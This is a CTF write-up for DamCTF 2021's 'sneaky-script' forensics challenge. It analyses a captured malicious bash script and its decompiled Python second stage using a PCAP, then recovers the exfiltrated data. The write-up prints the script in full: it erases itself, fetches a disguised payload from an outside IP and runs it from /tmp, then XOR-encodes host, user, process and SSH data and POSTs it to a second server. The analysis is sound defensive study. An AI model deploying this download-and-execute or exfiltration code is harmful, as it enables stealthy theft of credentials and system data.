# DamCTF 2021
## malware/sneaky-script

Writeup by ssh1n0b1, nxblnd (Zenbuai-gumi)

## Task preview

#### `malware/sneaky-script (forensics/rev)`, by captainGeech

We recovered a malicious script from a victim environment. Can you figure out what it did, and if any sensitive information was exfiltrated? We were able to export some PCAP data from their environment as well.

https://damctf-2021-prod-storage.storage.googleapis.com/uploads/331154a3259a40a796ed7cad0aa0c31e2c28484753e74ca18a91accf1342964e/files.zip


## Archive examination

At the start of this task we have an archive with two files:

`evidence.pcapng` - network data from the victim machine

`mal.sh` - malicious script

Firstly, let's open the script `mal.sh`:
```bash
#!/bin/bash

rm -f "${BASH_SOURCE[0]}"

which python3 >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

which curl >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

mac_addr=$(ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}')

curl 54.80.43.46/images/banner.png?cache=$(base64 <<< $mac_addr) -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg
python3 /tmp/.cacheimg
rm -f /tmp/.cacheimg


curl 54.80.43.46/images/banner.png?cache=NGI6ZTE6ZDY6YTg6NjY6YmUK -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg

```
This bash script:
1. Removes traces of itself
2. Checks for python3 installation
3. Checks for curl installation
4. Collects MAC-address
5. Downloads something to the `/tmp` folder
6. Executes this file using python
7. Removes the file

Now we have an IP address worth investigating: `54.80.43.46`
We also know that we should look for HTTP packets.
Let's open a second file in Wireshark and sort it by Source.
![](https://img.vos.uz/futt6foc.png)
(`evidence.pcapng`)

After looking through the traffic we can find the one we are looking for. Now we need to preview what this packet contains. RMB -> Follow -> HTTP Stream

![](https://img.vos.uz/innmqj4a.png)

If we take a closer look at the `mal.sh` we can see that this is Base64. Let's decode it using CyberChef:

![](https://img.vos.uz/4h1eekl8.png)

After decoding we get some kind of gibberish. However, we know that this will be executed with python and it looks like binary data.
Let's save it as a `.pyc` file and decompile it using uncompyle6.

## Stage 2

Turns out this was a python script and a lengthy one.
Let's start from the beginning (or in this case from the end) - `a()`

```python
def a():
    key = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    if '4b:e1:d6:a8:66:be' != key:
        return
    net = get_net_info()
    user = get_users()
    proc = get_proc()
    ssh = []
    for _, _, a, _ in user:
        ssh.append(get_ssh(a))

    data = build_output(net, user, proc, ssh)
    send(data)
```

This function collects all the data from the host and after that calls the `send(data)` function. 

```python
def send(data):
    c = http.client.HTTPConnection('34.207.187.90')
    p = json.dumps(data).encode()
    k = b'8675309'
    d = bytes([p[i] ^ k[(i % len(k))] for i in range(len(p))])
    c.request('POST', '/upload', base64.b64encode(d))
    x = c.getresponse()
```

Another IP address, POST request and another Base64 encoding. Let's look through the `evidence.pcapng` once more:

![](https://img.vos.uz/fjjss8wq.png)
(`evidence.pcapng`)

Going back to `send(data)` we can see that all the data the script collected was formatted into JSON, XORed and then encoded with base64. This means that we need to do these steps backwards. Several lines of python can do the trick:

```python 
>>> import base64 
>>> msg = 'QxRZU.........'
>>> msg = base64.b64decode(msg)
>>> k = b'8675309'
>>> msg = bytes([msg[i] ^ k[(i % len(k))] for i in range(len(msg))])
>>> msg
```
Let's send the output to the json beautifier and look through it. 

![](https://img.vos.uz/byco6yw1.png)
(`pwnd`)
